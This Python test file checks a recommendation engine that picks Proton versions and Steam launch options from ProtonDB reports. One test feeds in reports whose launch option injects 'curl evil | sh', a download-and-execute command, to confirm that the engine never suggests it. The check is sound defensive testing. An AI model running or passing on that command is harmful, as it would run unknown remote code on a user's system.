import pytest
from test_protondb import load_game

from autoproton.models import CompatSetting, CompatTool, GameSettings, HardwareProfile
from autoproton.protondb.parse import Report, parse_reports
from autoproton.recommend.engine import Params, recommend, wilson_lower_bound

NVIDIA = HardwareProfile(False, frozenset({"nvidia"}), "nvidia")
AMD = HardwareProfile(False, frozenset({"amd"}), "amd")
DECK = HardwareProfile(True, frozenset({"amd"}), "amd")
TOOLS = [CompatTool("proton_10", "Proton 10.0", "official"), CompatTool("proton_experimental", "Proton Experimental", "official"),
         CompatTool("GE-Proton10-25", "GE-Proton10-25", "custom", None, (10, 25, 0))]


def which_some(name):
    return "/usr/bin/" + name if name in ("gamemoderun", "mangohud") else None


def rec_for(appid, hw=NVIDIA, current=GameSettings(), tools=TOOLS, which=which_some):
    g = load_game(appid)
    return recommend(appid, parse_reports(g["reports"]), hw, tools, current, g["recorded"], which)


def opt(rec, text):
    return next(o for o in rec.options if o.component.text == text)


def test_wilson():
    assert wilson_lower_bound(1.0, 3, 1.28) < wilson_lower_bound(0.95, 300, 1.28)
    assert wilson_lower_bound(0.0, 0, 1.28) == 0.0


def test_cyberpunk_on_nvidia_pc():
    rec = rec_for(1091500)
    assert rec.tool.action == "set" and rec.tool.setting == CompatSetting("proton_10")
    assert rec.confidence == "high"
    on = [o.component.text for o in rec.options if o.default_on]
    assert "--launcher-skip" in on and "-skipStartScreen" in on
    assert not opt(rec, "gamemoderun").default_on and opt(rec, "gamemoderun").available
    assert opt(rec, "PROTON_FSR4_UPGRADE=1").hidden  # AMD-only
    assert rec.launch_options(None).startswith("%command% --launcher-skip")
    assert {a.label for a in rec.alternatives} >= {"Proton 10.0", "GE-Proton10-25", "Proton Experimental"}


def test_cyberpunk_on_amd_shows_fsr4_as_optional():
    o = opt(rec_for(1091500, AMD), "PROTON_FSR4_UPGRADE=1")
    assert not o.hidden and not o.default_on


def test_missing_wrapper_is_unavailable():
    o = opt(rec_for(1091500, which=lambda n: None), "gamemoderun")
    assert not o.available and "isn't installed" in o.reason


def test_dota_is_native_with_audio_fix():
    rec = rec_for(570)
    assert rec.tool.action == "keep" and rec.tool.family == "native"
    assert opt(rec, "-sdlaudiodriver pulse").default_on
    forced = GameSettings(None, CompatSetting("proton_experimental"))
    rec = rec_for(570, current=forced)
    assert rec.tool.action == "clear"
    assert rec.settings(forced).compat_tool is None


def test_native_preferred_on_deck_when_it_works_as_well():
    assert rec_for(413150, DECK).tool.family == "native"


def test_keeps_current_tool_when_it_works_about_as_well():
    reps = [mk(i) for i in range(40)] + [mk(100 + i, family="ge", version=(10, 20)) for i in range(19)]
    reps += [mk(200, works=False, family="ge", version=(10, 20))]
    current = GameSettings(None, CompatSetting("GE-Proton10-25"))
    rec = recommend(1, reps, NVIDIA, TOOLS, current, 1_800_000_000, lambda n: None)
    assert rec.tool.action == "keep" and rec.tool.family == "ge"
    # without a current tool, the better-scoring official Proton wins
    assert recommend(1, reps, NVIDIA, TOOLS, GameSettings(), 1_800_000_000, lambda n: None).tool.family == "official"


def test_deck_uses_deck_reports():
    rec = rec_for(1091500, DECK)
    assert "Steam Deck" in rec.pool_description
    assert rec.tool.setting is not None


def mk(i, works=True, family="official", version=(10, 0), lo="", hw="pc", age_days=10, now=1_800_000_000, oob=None):
    return Report(str(i), int(now - age_days * 86400), hw, "nvidia", works, oob is not None, oob, family, version,
                  "x", lo, 0, False, "")


def test_ge_needed_when_official_fails():
    reps = [mk(i, works=False) for i in range(10)] + [mk(100 + i, family="ge", version=(10, 30)) for i in range(10)]
    rec = recommend(1, reps, NVIDIA, [], GameSettings(), 1_800_000_000, lambda n: None)
    assert rec.tool.family == "ge" and rec.tool.needs_download and rec.tool.ge_major == 10
    # until it's downloaded, the current setting is left alone
    assert rec.settings(GameSettings(None, CompatSetting("proton_9"))).compat_tool == CompatSetting("proton_9")
    rec = recommend(1, reps, NVIDIA, TOOLS, GameSettings(), 1_800_000_000, lambda n: None)
    assert rec.tool.setting == CompatSetting("GE-Proton10-25") and not rec.tool.needs_download


def test_no_reports():
    rec = recommend(1, [], NVIDIA, TOOLS, GameSettings("-x", None), 1_800_000_000, lambda n: None)
    assert rec.confidence == "none" and rec.tool.action == "keep" and rec.options == []
    assert rec.warnings
    assert rec.settings(GameSettings("-x", None)) == GameSettings("-x", None)


def test_unsafe_option_never_suggested():
    reps = [mk(i, lo="%command% ; curl evil | sh") for i in range(20)]
    rec = recommend(1, reps, NVIDIA, TOOLS, GameSettings(), 1_800_000_000, lambda n: "/usr/bin/" + n)
    assert all("curl" not in o.component.text and "sh" != o.component.key for o in rec.options)


def test_options_needed_out_of_the_box_count_more():
    base = [mk(i) for i in range(20)]
    fix = [mk(100 + i, lo="PROTON_USE_WINED3D=1 %command%", oob=False) for i in range(3)]
    rec = recommend(1, base + fix, NVIDIA, TOOLS, GameSettings(), 1_800_000_000, lambda n: None,
                    Params(option_default_share=0.15))
    o = next(o for o in rec.options if o.component.key == "PROTON_USE_WINED3D")
    assert o.share > 3 / 23 and o.default_on


def test_options_common_in_failing_reports_not_ticked():
    reps = [mk(i, lo="%command% -dx11") for i in range(5)] + [mk(10 + i, works=False, lo="%command% -dx11") for i in range(6)]
    reps += [mk(30 + i) for i in range(10)]
    rec = recommend(1, reps, NVIDIA, TOOLS, GameSettings(), 1_800_000_000, lambda n: None)
    o = next(o for o in rec.options if o.component.key == "-dx11")
    assert not o.default_on and o.failing == 6


@pytest.mark.parametrize("current,replace,expected", [
    (None, False, "%command% --launcher-skip"),
    ("-novid", False, "-novid --launcher-skip"),
    ("-novid", True, "%command% --launcher-skip"),
])
def test_launch_option_modes(current, replace, expected):
    reps = [mk(i, lo="%command% --launcher-skip") for i in range(10)]
    rec = recommend(1, reps, NVIDIA, TOOLS, GameSettings(current), 1_800_000_000, lambda n: None)
    assert rec.launch_options(current, replace=replace) == expected


def test_nothing_ticked_and_replace_means_remove():
    rec = recommend(1, [mk(i) for i in range(10)], NVIDIA, TOOLS, GameSettings("-x"), 1_800_000_000, lambda n: None)
    assert rec.launch_options("-x", components=[], replace=True) is None
    assert rec.launch_options("-x", components=[]) == "-x"


def test_percent_never_rounds_up_past_the_tick_threshold():
    from autoproton.recommend.engine import OptionSuggestion
    from autoproton.recommend.launchopts import Component

    o = OptionSuggestion(Component("arg", "--intro-skip"), "arg", 0.1493, 222, 0, False, True, False, "")
    assert o.percent == "14%"
    assert OptionSuggestion(Component("arg", "-x"), "arg", 0.15, 3, 0, True, True, False, "").percent == "15%"
